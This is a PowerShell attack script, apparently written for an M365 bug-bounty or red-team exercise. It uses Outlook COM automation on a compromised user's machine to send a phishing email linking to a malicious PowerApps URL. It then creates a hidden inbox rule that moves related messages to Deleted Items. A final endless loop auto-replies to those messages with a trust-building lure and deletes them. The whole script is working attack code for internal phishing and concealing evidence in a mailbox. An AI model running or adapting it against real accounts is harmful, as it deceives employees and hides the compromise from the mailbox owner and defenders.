# Description:
# This script will interact with the open Outlook client using COM objects to send an email + create a mail rule.


# Variables
$to = "global.admin@BugBountyM365Phish.onmicrosoft.com"

#####
##### OUTLOOK COM Functions
#####
function Send-Email($outlook, $to, $subject, $body) {
    # create Outlook MailItem named Mail using CreateItem() method
    $Mail = $outlook.CreateItem(0)

    # add properties as desired
    $Mail.To = [string]$to
    $Mail.Subject = [string]$subject
    $Mail.Body = [string]$body

    # send message
    $Mail.Send()
    write-host "[+] Sent Outlook Email to $to"
}

function Add-Rule($outlook, $rule_name, $bodyOrSubjectText) {
    # Get the Outlook namespace
    $Namespace = $Outlook.GetNamespace("MAPI")
    
    # Get a list of all of the Outlook rules
    $Rules = $Namespace.DefaultStore.GetRules()

    If ($Rules.Count -gt 0 -and ($rules | select Name).Name.Contains($rule_name)) {
        write-host "[!] Mail rule with that name already exists, skipping"
        return
    }

    # Now the fun part. Let's start creating a rule
    $Rule = $Rules.create(
        [string]$rule_name, # The name of the rule
        0 # https://learn.microsoft.com/en-us/dotnet/api/microsoft.office.interop.outlook.olruletype?view=outlook-pia | [Microsoft.Office.Interop.Outlook.OlRuleType]::olRuleReceive # Weird looking, but just means the rule will target received emails
    )
    
    # Start creating the 
    $Condition = $Rule.Conditions.BodyOrSubject
    $Condition.Enabled = $true
    $condition.text = @($bodyOrSubjectText)

    # send item to deleted folder
    $Action = $Rule.Actions.Delete
    $Action.Enabled = $True

    # Now save everything
    $Rules.Save()
    
    write-host "[+] Created new malicious mail rule to route $bodyOrSubjectText to Deleted Items folder" 
}

function Invoke-RespondToDeletedEmails($outlook, $bodyOrSubjectText = "this_string_should_not_be_in_an_email", $reply_body) {
    # create Outlook MailItem named Mail using CreateItem() method
    $namespace = $outlook.GetNamespace("MAPI")

    # https://learn.microsoft.com/en-us/dotnet/api/microsoft.office.interop.outlook.oldefaultfolders?view=outlook-pia
    $deletedItemsFolder = $namespace.GetDefaultFolder(3) # [Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderDeletedItems)
    $emails = $deletedItemsFolder.Items

    foreach ($email in $emails) {
        If (
            $email.subject.Contains($bodyOrSubjectText) -or $email.body.Contains($bodyOrSubjectText)
        ) {
            Write-Output "Found Email! Sending reply and deleting.`n(Subject): $($email.Subject)" # - $($email.body)"
            $email.UnRead = $false

            $sent_from = $email.sender.Address
            $reply = $email.Reply()
            $reply.HTMLBody = $reply_body
            $reply.Send()

            # delete email
            $email.Delete()
        }
    }
}


#### ^ END FUNCTIONS ^



##################
#### MAIN 
##################


##### Stage 2: MALICIOUS Outlook Actions (Technique: COM Objects)
# create COM object named Outlook
# Add-Type -AssemblyName Microsoft.Office.Interop.Outlook
# [Reflection.Assembly]::LoadWithPartialname("Microsoft.Office.Interop.Outlook") 
$outlook = New-Object -ComObject Outlook.Application
write-host "[+] Interacting with Outlook as user (COM Objects):  $($outlook.Session.CurrentUser.AddressEntry.GetExchangeUser().PrimarySmtpAddress)"


# Create mail rule
# https://davejlong.com/scripting-office-with-powershell-creating-outlook-rules/


# send phishing email
$malicious_powerapp_url = "https://powerapps.com/mybadapp" # $new_app.powerapp_phish_url

Send-Email -outlook $outlook -to $to -subject "Please review: $malicious_powerapp_url" -body "Can you please take a look at this, what do you think? $malicious_powerapp_url"
Add-Rule -outlook $outlook -rule_name "Malicious Rule: Route powerapp email to trash" -bodyOrSubjectText $malicious_powerapp_url







### FINAL LOOP
write-host "DONE! Looping Outlook / Teams Actions"
while ($true) {
    # outlook, check emails + respond to deleted emails
    # in a real attack scanario a C2 server may be used for a more convincing phish
    Invoke-RespondToDeletedEmails -outlook $outlook -bodyOrSubjectText $malicious_powerapp_url -reply_body "It's totally cool, we are co-workers. Trust. $malicious_powerapp_url"

    start-sleep 1
}
